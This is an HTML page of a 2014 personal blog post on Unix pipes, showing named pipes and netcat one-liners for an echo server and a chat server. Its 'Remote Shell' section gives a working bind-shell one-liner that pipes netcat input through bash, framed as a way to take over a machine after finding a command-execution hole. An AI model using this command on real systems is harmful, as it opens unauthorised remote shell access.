<!DOCTYPE html>
<html lang="en">
<head>

    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    <title>
         aleph_null 
    </title>
    

    <link rel="stylesheet" href="/static/css/blog.css">
    
<link rel="stylesheet" href="/static/css/pygments.css">

    
    <script>
        (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
        ga('create', 'UA-40829655-2', 'auto');
        ga('send', 'pageview');
    </script>
    <script>
        window.addEventListener('load', function() {
            const EMAIL = ['vasumanar', 'gmail.com'];
            var emailLink = document.getElementById('email-link');
            emailLink.href = 'mailto:' + EMAIL[0] + '@' + EMAIL[1];
        });
    </script>
    

</head>
<body>
    <div id="header" > 
        <a href="/"><h1> aleph_null </h1></a> 
        <h2> Nothing to see here </h2>
    </div>
    <nav>
        <ul>
            
            <li>
                <a href="/index.html">Posts</a>
            </li>
            
            <li>
                <a href="/about.html">About Me</a>
            </li>
            
        </ul>
    </nav>
    <div id="content">
    
    <article>
        <div class="post-description">
            <h3>Fun With Pipes</h3>
            <time datetime="2014-10-06">06 Oct 2014</time>
        </div>
        <h2>Pipes</h2>
<p>Commonly, pipes are used in the shell to redirect the output of one process to the
input of another, you simply</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span class="nv">$ </span>cat myfile | grep sometext
</pre></div>
</td></tr></table>

<h2>Named pipes</h2>
<p>Since <code>|</code> pipes are anonymous, they cannot be referenced externally.
Named pipes on the other hand are identifiable by a location in the
filesystem.</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span class="nv">$ </span>mkfifo /tmp/mypipe
</pre></div>
</td></tr></table>

<p>The fact that they are referencable across shell commands leads to
some very applications. Data can be pumped in by one
command and fed to another command. Like,</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span class="nv">$ </span>cat /tmp/mypipe
</pre></div>
</td></tr></table>

<p>And in another shell,</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span class="nv">$ </span><span class="nb">echo </span>hello &gt; /tmp/mypipe
</pre></div>
</td></tr></table>

<p>Named pipes allow us to setup circular references in interesting
applications.</p>
<h2>Echo Server</h2>
<p>Let's start of with something simple, an <strong>echo server</strong>. The
principle is to simply <em>echo</em> the input of the user. The input is the
output. The <a href="http://sectools.org/tool/netcat/">netcat</a> utility will
help us setup a simple listening socket.</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span class="nv">$ </span>cat /tmp/mypipe | nc -l 59000 &gt; /tmp/mypipe
</pre></div>
</td></tr></table>

<p>Simply <code>cat</code>ing the contents of a pipe to the input of the
<code>nc</code> command with the <code>-l</code> option that sets up a port to listen on and
write any incoming data to the same pipe so that it's echoed back.</p>
<p>There you have it, an echo server in <em>one line of bash</em></p>
<h2>Remote Shell</h2>
<p>Now, something more interesting. Suppose, you have discovered a
vulnerability in some service that allows you to execute a single
command on the shell. Now you want to drop a shell on that box. What
you gonna do? No worries, I got you covered.</p>
<p>By slightly modifying the earlier snippet, we can set it up. Instead
of simply echoing back the input, just pipe it through the bash
interpreter.</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span class="nv">$ </span>cat /tmp/mypipe | bash | nc -l 59000 &gt; /tmp/mypipe
</pre></div>
</td></tr></table>

<p>Boom! pWned!!</p>
<h2>Chat Server</h2>
<p>A chat server can be thought of as an echo server with multiple
hosts. Sadly though, the netcat utility only allows only a single
connection. Luckily, there's <a href="http://nmap.org/ncat/">this</a> tool that allows us to
accept multiple incoming connections.</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span class="nv">$ </span>cat /tmp/mypipe | ncat -l -k 59000 &gt; /tmp/mypipe
</pre></div>
</td></tr></table>
    </article>

    </div>
    <footer>
        <address>
            <a id="email-link" href="#">Vasuman Ravichandran</a>
        </address>
        <div id="accounts">
            <ul>
                <li><a href="https://github.com/vasuman">GitHub</a></li>
                <li><a href="https://twitter.com/vasumanr">Twitter</a></li>
            </ul>
        </div>
        <div id="creds">
            Generated using, <a href="https://github.com/vasuman/glob">glob</a>
        </div>
    </footer>
</body>
</html>